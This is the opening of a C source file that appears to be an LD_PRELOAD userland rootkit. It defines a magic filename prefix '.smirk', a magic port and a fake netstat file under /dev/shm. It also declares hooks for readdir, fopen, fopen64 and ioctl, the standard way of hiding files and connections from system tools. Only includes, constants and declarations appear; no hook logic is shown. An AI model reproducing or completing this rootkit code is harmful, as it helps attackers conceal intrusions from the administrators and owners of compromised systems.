#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <linux/fs.h>
#include <regex.h>
#include <stdlib.h>
#include <errno.h>
// #define DEBUG

#define LIBC "libc.so.6"
#define MAGIC_PREFIX ".smirk"
#define MAGIC_PORT 65535
#define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"

void *load_libc(char *);

struct dirent *(*hooked_readdir)(DIR *);
FILE *(*hooked_fopen)(const char *, const char *);
FILE *(*hooked_fopen64)(const char *, const char *);
int (*hooked_ioctl)(int , unsigned long , unsigned long *);